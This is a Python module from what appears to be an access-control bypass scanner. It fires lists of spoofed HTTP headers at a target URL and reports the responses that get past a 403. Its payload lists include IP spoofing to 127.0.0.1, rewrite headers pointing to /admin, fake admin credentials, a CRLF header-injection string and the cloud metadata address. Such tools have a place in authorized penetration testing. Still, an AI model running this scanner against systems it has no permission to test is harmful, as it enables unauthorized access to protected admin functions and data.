"""
Technique: Header Injection Bypasses
--------------------------------------
Many access controls run at a reverse proxy / WAF level.
These proxies trust certain headers from "internal" sources.
By injecting those headers we can spoof our IP, identity,
or routing context — making the backend think we're internal.

Headers that commonly bypass access controls:
  - X-Forwarded-For: 127.0.0.1
  - X-Real-IP: 127.0.0.1
  - X-Original-URL: /admin
  - X-Rewrite-URL: /admin
  - X-Custom-IP-Authorization: 127.0.0.1
  - X-Forwarded-Host: localhost
  - X-Host: localhost
  - Referer: https://target.com/admin
  - X-Originating-IP: 127.0.0.1
  - True-Client-IP: 127.0.0.1
"""

from ..core import http_request, is_bypass, colored_status, R, G, Y, C, DIM, BOLD, RST

# Headers that can spoof IP / source
IP_SPOOF_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "True-Client-IP",
    "CF-Connecting-IP",
    "X-Custom-IP-Authorization",
    "X-Forwarded",
    "Forwarded-For",
    "X-Cluster-Client-IP",
    "Fastly-Client-IP",
    "X-ProxyUser-Ip",
    "Client-IP",
    "X-Original-Forwarded-For",
    "X-Host-Override",
]

# IPs to spoof as
BYPASS_IPS = [
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "::1",
    "127.0.0.1, 127.0.0.1",
    "127.0.0.1%0d%0aX-Forwarded-For: 127.0.0.1",  # header injection
    "169.254.169.254",   # cloud metadata
    "192.168.1.1",
    "10.0.0.1",
    "172.16.0.1",
]

# Headers that rewrite the URL path
URL_REWRITE_HEADERS = [
    ("X-Original-URL",     "{path}"),
    ("X-Rewrite-URL",      "{path}"),
    ("X-Override-URL",     "{path}"),
    ("X-Forwarded-Path",   "{path}"),
    ("X-Request-URI",      "{path}"),
    ("Destination",        "{full_url}"),
]

# Host override headers
HOST_OVERRIDE_HEADERS = [
    ("X-Forwarded-Host",   "localhost"),
    ("X-Host",             "localhost"),
    ("X-Forwarded-Server", "localhost"),
    ("X-HTTP-Host-Override","localhost"),
    ("Forwarded",          "host=localhost"),
]

# Auth-related bypass headers
AUTH_BYPASS_HEADERS = [
    ("X-Admin",            "true"),
    ("X-Admin",            "1"),
    ("X-Internal",         "true"),
    ("X-Internal-Request", "1"),
    ("X-Forwarded-User",   "admin"),
    ("X-Remote-User",      "admin"),
    ("X-Auth-User",        "admin"),
    ("X-Authenticated",    "true"),
    ("X-Auth-Token",       "bypass"),
    ("Authorization",      "Bearer admin"),
    ("Authorization",      "Basic YWRtaW46YWRtaW4="),  # admin:admin
    ("Authorization",      "Basic YWRtaW46"),           # admin:
    ("X-Api-Key",          "admin"),
    ("X-API-KEY",          "debug"),
    ("X-Debug",            "true"),
    ("X-Debug",            "1"),
    ("X-Dev-Mode",         "true"),
]

# Miscellaneous bypass headers
MISC_HEADERS = [
    ("Content-Length",         "0"),
    ("Transfer-Encoding",      "chunked"),
    ("Cache-Control",          "no-cache"),
    ("X-Original-URL",         "/"),
    ("Referer",                "{base_url}"),
    ("Origin",                 "{base_url}"),
    ("X-Forwarded-Proto",      "https"),
    ("X-Forwarded-Port",       "443"),
    ("X-HTTPS",                "1"),
    ("Front-End-Https",        "on"),
]


def run(url: str, path: str, baseline: dict,
        cookies: str = None, extra_headers: dict = None,
        verbose: bool = True) -> list:
    """
    Run all header injection bypasses.
    Returns list of bypass findings.
    """
    findings = []
    base_headers = extra_headers or {}

    import urllib.parse
    parsed   = urllib.parse.urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    full_url = url

    if verbose:
        total = (len(IP_SPOOF_HEADERS) * len(BYPASS_IPS) +
                 len(URL_REWRITE_HEADERS) + len(HOST_OVERRIDE_HEADERS) +
                 len(AUTH_BYPASS_HEADERS) + len(MISC_HEADERS))
        print(f"\n  {C}[HEADER BYPASS]{RST} Testing ~{total} header combinations")

    def _test(header_name, header_value, technique_name):
        headers = {**base_headers, header_name: header_value}
        resp    = http_request(url, headers=headers, cookies=cookies)
        bypassed, conf, reason = is_bypass(
            baseline["status"], resp["status"],
            baseline["body_length"], resp["body_length"]
        )
        result = {
            "technique":   "header_injection",
            "variant":     technique_name,
            "header":      header_name,
            "value":       header_value,
            "url":         url,
            "status":      resp["status"],
            "body_length": resp["body_length"],
            "bypass":      bypassed,
            "confidence":  conf,
            "reason":      reason,
            "body_snippet":resp["body"][:200] if bypassed else "",
        }
        if bypassed:
            findings.append(result)
            if verbose:
                col = G if conf == "high" else Y
                print(f"\r{' '*70}\r  {col}{BOLD}[BYPASS]{RST} {technique_name}")
                print(f"    Header : {header_name}: {header_value[:60]}")
                print(f"    Status : {colored_status(resp['status'])} | "
                      f"Length: {resp['body_length']}")
                print(f"    Reason : {reason}\n")
        elif verbose:
            print(f"  {DIM}[{colored_status(resp['status'])}]{RST} "
                  f"{header_name}: {header_value[:30]:<30}", end="\r")
        return result

    # IP spoofing headers
    for header in IP_SPOOF_HEADERS:
        for ip in BYPASS_IPS[:4]:  # top 4 IPs per header
            _test(header, ip, f"ip_spoof_{header.lower().replace('-','_')}")

    # URL rewrite headers
    for header, tmpl in URL_REWRITE_HEADERS:
        val = tmpl.replace("{path}", path).replace("{full_url}", full_url)
        _test(header, val, f"url_rewrite_{header.lower().replace('-','_')}")

    # Host override
    for header, val in HOST_OVERRIDE_HEADERS:
        _test(header, val, f"host_override_{header.lower().replace('-','_')}")

    # Auth bypass headers
    for header, val in AUTH_BYPASS_HEADERS:
        _test(header, val, f"auth_bypass_{header.lower().replace('-','_')}")

    # Misc
    for header, tmpl in MISC_HEADERS:
        val = tmpl.replace("{base_url}", base_url)
        _test(header, val, f"misc_{header.lower().replace('-','_')}")

    if verbose:
        print(f"\r{' '*70}\r", end="")

    return findings
